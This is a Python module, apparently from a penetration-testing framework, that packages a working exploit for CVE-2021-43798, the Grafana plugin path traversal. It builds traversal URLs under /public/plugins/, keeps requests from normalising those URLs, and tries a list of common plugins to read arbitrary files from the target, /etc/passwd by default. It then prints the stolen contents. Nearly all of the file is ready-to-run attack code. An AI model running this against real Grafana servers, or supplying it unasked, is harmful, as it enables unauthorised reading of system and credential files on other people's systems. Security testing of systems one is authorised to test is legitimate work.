"""Grafana Path Traversal (CVE-2021-43798) exploit module"""

from typing import Dict, Any, Optional
import requests
from rich.console import Console
from rich.panel import Panel
from hatiyar.core.module_base import CVEModule

console = Console()


# Common Grafana plugins to attempt for traversal path
PLUGIN_LIST = [
    "alertlist",
    "annolist",
    "barchart",
    "bargauge",
    "candlestick",
    "cloudwatch",
    "dashlist",
    "elasticsearch",
    "gauge",
    "geomap",
    "gettingstarted",
    "grafana-azure-monitor-datasource",
    "graph",
    "heatmap",
    "histogram",
    "influxdb",
    "jaeger",
    "logs",
    "loki",
    "mssql",
    "mysql",
    "news",
    "nodeGraph",
    "opentsdb",
    "piechart",
    "pluginlist",
    "postgres",
    "prometheus",
    "stackdriver",
    "stat",
    "state-timeline",
    "status-histor",
    "table",
    "table-old",
    "tempo",
    "testdata",
    "text",
    "timeseries",
    "welcome",
    "zipkin",
]


class Module(CVEModule):
    """Exploit CVE-2021-43798 to read arbitrary files via plugin path traversal"""

    NAME = "Grafana Directory Traversal"
    DESCRIPTION = "Exploit CVE-2021-43798 to read arbitrary files via public plugins path traversal"
    CATEGORY = "cve"

    CVE = "CVE-2021-43798"
    AFFECTED_VERSIONS = ["8.0.0-beta1 - 8.3.0"]
    PATCHED_VERSIONS = ["8.3.1", "8.2.7", "8.1.8", "8.0.7"]

    OPTIONS = {
        "RHOST": "",
        "RPORT": 3000,
        "SCHEME": "http",
        "VERIFY_SSL": False,
        "TIMEOUT": 5,
        "FILE": "/etc/passwd",
        "PLUGIN": "",  # Try this plugin first; if empty, iterate common list
        "USER_AGENT": "Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0",
    }

    REQUIRED_OPTIONS = ["RHOST", "PLUGIN"]

    def _build_url(self, plugin: str, file_path: str) -> str:
        scheme = str(self.get_option("SCHEME") or "http")
        host = str(self.get_option("RHOST") or "")
        port = int(self.get_option("RPORT") or 3000)

        file_path = file_path if file_path.startswith("/") else f"/{file_path}"
        traversal = "/../../../../../../../../../../../../.." + file_path

        return f"{scheme}://{host}:{port}/public/plugins/{plugin}{traversal}"

    def _try_read_file(
        self, session: requests.Session, plugin: str, file_path: str
    ) -> Optional[requests.Response]:
        url = self._build_url(plugin, file_path)
        headers = {"User-Agent": str(self.get_option("USER_AGENT"))}
        verify_ssl = bool(self.get_option("VERIFY_SSL"))
        timeout = int(self.get_option("TIMEOUT") or 5)

        try:
            # Prepare the request manually to prevent URL normalization
            req = requests.Request("GET", url, headers=headers)
            prepared_req = session.prepare_request(req)

            # This is the key: by setting the URL on the prepared request,
            # we bypass the normalization that happens in session.get()
            prepared_req.url = url

            resp = session.send(prepared_req, verify=verify_ssl, timeout=timeout)

            # Success often returns 200 with file content and not the 'Plugin file not found' marker
            if resp.status_code == 200 and "Plugin file not found" not in resp.text:
                return resp
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Request failed: {e}[/red]")
            return None
        return None

    def check(self) -> bool:
        """Check if target is vulnerable - returns True by default for this exploit"""
        return True

    def exploit(self) -> Dict[str, Any]:
        """Attempt to read the requested file using discovered or common plugins"""
        session = requests.Session()
        target_file = str(self.get_option("FILE") or "/etc/passwd")

        # Use the plugin discovered during check if available, otherwise try specified/all
        if "plugin" in self.results:
            plugins = [self.results["plugin"]]
        else:
            chosen_plugin = str(self.get_option("PLUGIN") or "").strip()
            plugins = [chosen_plugin] if chosen_plugin else PLUGIN_LIST

        console.print(
            Panel.fit(
                f"Reading [bold]{target_file}[/bold] from {self.get_option('RHOST')}:{self.get_option('RPORT')}",
                title="CVE-2021-43798",
                border_style="cyan",
            )
        )

        for plugin in plugins:
            resp = self._try_read_file(session, plugin, target_file)
            if resp is not None:
                console.print(
                    f"[green]✓ Success via plugin:[/green] [bold]{plugin}[/bold]"
                )
                # Display the file content in a panel
                console.print(
                    Panel(
                        resp.text,
                        title=f"Contents of {target_file}",
                        border_style="green",
                        expand=False,
                    )
                )
                return {
                    "success": True,
                    "vulnerable": True,
                    "plugin": plugin,
                    "file": target_file,
                    "status_code": resp.status_code,
                }

        return {
            "success": False,
            "error": "Unable to read requested file with available plugins",
        }
